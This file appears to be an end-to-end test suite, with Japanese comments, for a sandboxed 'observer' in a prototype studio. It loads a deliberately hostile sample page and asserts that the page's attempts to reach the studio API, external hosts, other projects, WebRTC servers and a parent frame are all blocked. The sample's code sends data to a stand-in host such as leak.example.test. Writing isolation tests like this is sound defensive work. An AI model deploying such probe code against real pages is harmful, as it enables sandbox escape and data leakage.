import dgram from 'node:dgram';
import fs from 'node:fs/promises';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { chromium } from 'playwright-core';
import { ObserverBrowser } from '../../src/observer/browser.js';
import { Observer } from '../../src/observer/observe.js';
import { loadConfig } from '../../src/server/config.js';
import { startStudio } from '../../src/server/index.js';
import { expect, ROOT, test } from './studio.js';

// 観察器の隔離(docs/adr/0002-observer-and-harness.md、S8、S13)。
// test/e2e/isolation.spec.js と同じ悪意のある見本を、Studio の画面ではなく観察器で開く。
// このファイルのテストは page(Studio の画面)を開かない。
const FIXTURES = path.join(ROOT, 'test', 'fixtures', 'observe');
// 外部のホスト名。.test は予約された名前(RFC 6761)で、実在の相手には届かない
const EXTERNAL = 'leak.example.test';

// 悪意のある見本。試みごとに「probe <名前>: <結果>」を console.error で出す。観察器はこれを report の errors に入れる
function probeSource({ studioOrigin, otherBuildUrl, sinkOrigin, udpPort }) {
  return `
const violations = [];
document.addEventListener('securitypolicyviolation', (event) => violations.push(event.blockedURI));
function report(name, outcome) {
  console.error('probe ' + name + ': ' + outcome);
}
function attempt(name, fn) {
  try {
    fn();
    report(name, 'allowed');
  } catch (error) {
    report(name, 'blocked');
  }
}
// 失敗が CSP によるものだけを blocked とする。404 などで失敗しても blocked にしない
const byCsp = (name, url) => () =>
  setTimeout(() => report(name, violations.includes(url) ? 'blocked' : 'failed without CSP violation'), 200);
function request(name, url) {
  fetch(url).then(() => report(name, 'allowed'), byCsp(name, url));
}
function load(name, element, url) {
  element.onload = () => report(name, 'allowed');
  element.onerror = byCsp(name, url);
  element.src = url;
  document.body.append(element);
}
function hint(rel, href) {
  const link = document.createElement('link');
  link.rel = rel;
  link.href = href;
  document.head.append(link);
}

request('studio-api', ${JSON.stringify(`${studioOrigin}/api/projects`)});
request('external-fetch', ${JSON.stringify(`http://fetch.${EXTERNAL}/?data=fictional-stock`)});
request('sink-fetch', ${JSON.stringify(`${sinkOrigin}/fetch`)});
request('other-project-fetch', ${JSON.stringify(otherBuildUrl)});
attempt('local-storage', () => window.localStorage.setItem('k', 'v'));
attempt('cookie', () => { document.cookie = 'k=v'; if (!document.cookie.includes('k=v')) throw new Error('no cookie'); });
attempt('parent-dom', () => window.parent.document.body.innerHTML);
attempt('top-navigation', () => { window.top.location.href = ${JSON.stringify(`${sinkOrigin}/top`)}; });
load('external-image', new Image(), ${JSON.stringify(`http://image.${EXTERNAL}/pixel.png`)});
load('sink-image', new Image(), ${JSON.stringify(`${sinkOrigin}/pixel.png`)});
load('other-project-script', document.createElement('script'), ${JSON.stringify(`${otherBuildUrl}app.js`)});
// リンクの先読み。結果は返らないので、届かないことは名前の解決の記録と受け手で確かめる
hint('prefetch', ${JSON.stringify(`http://prefetch.${EXTERNAL}/next.html`)});
hint('dns-prefetch', ${JSON.stringify(`//dns-prefetch.${EXTERNAL}`)});
hint('preconnect', ${JSON.stringify(`http://preconnect.${EXTERNAL}`)});
hint('prefetch', ${JSON.stringify(`${sinkOrigin}/prefetch`)});
const anchor = document.createElement('a');
anchor.href = ${JSON.stringify(`http://anchor.${EXTERNAL}/`)};
anchor.textContent = '架空の案内';
document.body.append(anchor);

// WebRTC: loopback の UDP の受け手への STUN と、外部の IP への TURN(TCP)
try {
  const peer = new RTCPeerConnection({
    iceServers: [
      { urls: 'stun:127.0.0.1:${udpPort}' },
      { urls: 'stun:stun.${EXTERNAL}:3478' },
      { urls: 'turn:192.0.2.7:3478?transport=tcp', username: 'architect', credential: 'fictional' },
    ],
  });
  let candidates = 0;
  peer.createDataChannel('probe');
  peer.onicecandidate = (event) => {
    if (event.candidate) candidates += 1;
    else report('webrtc', candidates === 0 ? 'blocked' : 'allowed ' + candidates);
  };
  peer.createOffer().then((offer) => peer.setLocalDescription(offer));
} catch (error) {
  report('webrtc', 'blocked');
}

// 最後に、自分の iframe を他のプロジェクトのプレビューへ移す。frame-src はプレビューの origin を通すので、観察器の route が断つ
setTimeout(() => {
  window.location.href = ${JSON.stringify(otherBuildUrl)};
}, 1500);
`;
}

const PROBES = [
  'studio-api',
  'external-fetch',
  'sink-fetch',
  'other-project-fetch',
  'local-storage',
  'cookie',
  'parent-dom',
  'top-navigation',
  'external-image',
  'sink-image',
  'other-project-script',
  'webrtc',
];

let home;
let studio;
let sink;
let udp;
const sinkRequests = [];
let udpPackets = 0;

// Chromium の net log。名前の解決(HOST_RESOLVER_MANAGER_REQUEST)と、始まった要求(URL_REQUEST_START_JOB)を読む
async function readNetLog(file) {
  const log = JSON.parse(await fs.readFile(file, 'utf8'));
  const types = Object.fromEntries(Object.entries(log.constants.logEventTypes).map(([name, id]) => [id, name]));
  const hosts = [];
  const urls = [];
  for (const event of log.events) {
    const type = types[event.type];
    if (type === 'HOST_RESOLVER_MANAGER_REQUEST' && event.params?.host) {
      hosts.push(/^(?:[a-z]+:\/\/)?(\[[^\]]*\]|[^:/]+)/i.exec(event.params.host)[1]);
    }
    if (type === 'URL_REQUEST_START_JOB' && event.params?.url) urls.push(event.params.url);
  }
  return { hosts, urls };
}

// 本物の観察器と同じ起動の引数に、net log を書く引数だけを足した観察器
function observerWithNetLog(name) {
  const file = path.join(home, `${name}.netlog.json`);
  const launch = (options) => chromium.launch({ ...options, args: [...options.args, `--log-net-log=${file}`] });
  const observer = new Observer({ browser: new ObserverBrowser({ launch }) });
  return { observer, netLog: () => readNetLog(file) };
}

async function buildOf(id) {
  const project = (await studio.store.list()).find((p) => p.id === id);
  return {
    result: project.lastBuild,
    previewUrl: `http://localhost:${studio.ports.preview}/p/${id}/${project.previewBuildId}/`,
    hostUrl: `http://127.0.0.1:${studio.ports.studio}/observe.html`,
  };
}

const probes = (report) =>
  Object.fromEntries(
    report.errors
      .filter((e) => e.kind === 'console-error' && e.message.startsWith('probe '))
      .map((e) => /^probe ([a-z-]+): (.*)$/.exec(e.message).slice(1)),
  );

test.describe.configure({ mode: 'serial' });

test.beforeAll(async () => {
  home = await fs.mkdtemp(path.join(os.tmpdir(), 'prototype-studio-observe-isolation-'));
  const write = async (id, files) => {
    const root = path.join(home, 'projects', id);
    await fs.mkdir(path.join(root, 'app'), { recursive: true });
    for (const [name, source] of Object.entries(files)) await fs.writeFile(path.join(root, 'app', name), source);
    await fs.mkdir(path.join(root, '.studio'), { recursive: true });
    await fs.writeFile(path.join(root, '.studio', 'project.json'), JSON.stringify({ title: `観察の隔離: ${id}` }));
  };
  // 見本の中身は、ポートが決まってから書く
  await write('probe', { 'main.js': "document.getElementById('root').textContent = '準備中';" });
  for (const name of ['ok', 'infinite-loop']) {
    await fs.cp(path.join(FIXTURES, name), path.join(home, 'projects', `obs-${name}`, 'app'), { recursive: true });
    await write(`obs-${name}`, {});
  }

  // Studio とプレビュー以外の受け手(HTTP と UDP)。何か届けば数える
  sink = http.createServer((req, res) => {
    sinkRequests.push(req.url);
    res.end('received');
  });
  await new Promise((resolve) => sink.listen(0, '127.0.0.1', resolve));
  udp = dgram.createSocket('udp4');
  udp.on('message', () => {
    udpPackets += 1;
  });
  await new Promise((resolve) => udp.bind(0, '127.0.0.1', resolve));

  const config = loadConfig({ STUDIO_HOME: home, STUDIO_PORT: '0', STUDIO_PREVIEW_PORT: '0', STUDIO_NO_OPEN: '1', STUDIO_AGENT: 'fake' });
  studio = await startStudio(config, { env: {} });
  const other = await buildOf('sample-library');
  await fs.writeFile(
    path.join(home, 'projects', 'probe', 'app', 'main.js'),
    probeSource({
      studioOrigin: `http://127.0.0.1:${studio.ports.studio}`,
      otherBuildUrl: other.previewUrl,
      sinkOrigin: `http://127.0.0.1:${sink.address().port}`,
      udpPort: udp.address().port,
    }),
  );
  expect((await studio.store.build('probe')).ok).toBe(true);
});

test.afterAll(async () => {
  await studio?.close();
  await new Promise((resolve) => (sink ? sink.close(resolve) : resolve()));
  udp?.close();
  if (home) await fs.rm(home, { recursive: true, force: true });
});

test('悪意のある見本を観察器で開いても、Studio の API、外部、他のプロジェクトに届かない。断った要求は report に残る', async () => {
  const { observer, netLog } = observerWithNetLog('probe');
  const other = await buildOf('sample-library');
  let report;
  try {
    report = await observer.observe({ build: await buildOf('probe'), viewports: [], limits: { settleMs: 3_000 } });
  } finally {
    await observer.close();
  }

  expect(report.verdict).toBe('failed');
  expect(report.load.done).toBe(true);
  // どの試みも、試作品の中から見て断たれた
  const outcomes = probes(report);
  for (const name of PROBES) expect(outcomes[name], name).toBe('blocked');

  // 断った要求が report に残る。他のプロジェクトへの移動は観察器の route が、画像と script は CSP が断った
  const blocked = report.errors.filter((e) => e.kind === 'blocked-request');
  expect(blocked).toContainEqual(expect.objectContaining({ blockedBy: 'route', url: other.previewUrl }));
  for (const url of [`http://image.${EXTERNAL}/pixel.png`, `http://127.0.0.1:${sink.address().port}/pixel.png`, `${other.previewUrl}app.js`]) {
    expect(blocked).toContainEqual(expect.objectContaining({ blockedBy: 'csp', url }));
  }
  for (const entry of blocked) expect(entry.message).toContain(entry.url);

  // 受け手には何も届かない(HTTP も WebRTC の UDP も)
  expect(sinkRequests).toEqual([]);
  expect(udpPackets).toBe(0);

  // ブラウザの中で始まった要求は、観察用の親ページと、観察したビルドのファイルだけ
  const { urls } = await netLog();
  const probeBuild = (await buildOf('probe')).previewUrl;
  const studioOrigin = `http://127.0.0.1:${studio.ports.studio}`;
  expect(urls.length).toBeGreaterThan(0);
  for (const url of urls) {
    expect(url.startsWith(probeBuild) || [`${studioOrigin}/observe.html`, `${studioOrigin}/observe.js`].includes(url), url).toBe(true);
  }
});

test('外部のホスト名を持つ画像とリンクの先読みが、名前の解決まで進まない(解決は loopback だけ)', async () => {
  const { observer, netLog } = observerWithNetLog('dns');
  try {
    const report = await observer.observe({ build: await buildOf('probe'), viewports: [], limits: { settleMs: 1_000 } });
    expect(report.verdict).toBe('failed');
    expect(report.load.done).toBe(true);

    // CSP と route を通らない直の移動。外部の名前と IP が解決に回らないことは、下の net log で確かめる
    const browser = await observer.browser.ensureBrowser();
    const context = await browser.newContext();
    try {
      const page = await context.newPage();
      for (const url of [`http://direct.${EXTERNAL}/`, 'http://192.0.2.7:81/']) {
        await expect(page.goto(url, { timeout: 5_000 }), url).rejects.toThrow(/net::ERR_(NAME_NOT_RESOLVED|PROXY_CONNECTION_FAILED)/);
      }
    } finally {
      await context.close();
    }
  } finally {
    await observer.close();
  }

  const { hosts } = await netLog();
  // 記録できていること: プレビューの localhost の解決は残る
  expect(hosts).toContain('localhost');
  // 解決に回った名前は loopback だけ。ほかは起動の規則で「~notfound」に置き換わり、元の名前は解決器に届かない
  for (const host of hosts) expect(['127.0.0.1', 'localhost', '~notfound'], host).toContain(host);
  expect(hosts).toContain('~notfound');
  expect(hosts.some((host) => host.includes('example.test') || host.includes('.invalid'))).toBe(false);
});

test('時間の上限を超えた観察は文脈ごと閉じ、次の観察は新しい文脈で動く', async () => {
  const browser = studio.observer.browser;
  const contexts = [];
  const closed = new Set();
  const withContext = browser.withContext.bind(browser);
  browser.withContext = (options, work) =>
    withContext(options, (context, ...rest) => {
      contexts.push(context);
      context.once('close', () => closed.add(context));
      return work(context, ...rest);
    });
  try {
    // 読み込みの時間切れ(10 秒)より先に、観察の全体の上限(1.5 秒)が来る
    const report = await studio.observe('obs-infinite-loop', { viewports: [], limits: { loadTimeoutMs: 10_000, observeTimeoutMs: 1_500 } });
    expect(report.verdict).toBe('unverified');
    expect(report.reason).toContain('観察が時間内に終わりませんでした');
    expect(report.durationMs).toBeLessThan(10_000);
    expect(contexts).toHaveLength(1);
    expect(closed.has(contexts[0])).toBe(true);
    expect(browser.browser?.contexts() ?? []).toEqual([]);

    const next = await studio.observe('obs-ok', { viewports: [] });
    expect(next.verdict).toBe('passed');
    expect(contexts).toHaveLength(2);
    expect(contexts[1]).not.toBe(contexts[0]);
    expect(closed.has(contexts[1])).toBe(true);
  } finally {
    browser.withContext = withContext;
  }
});
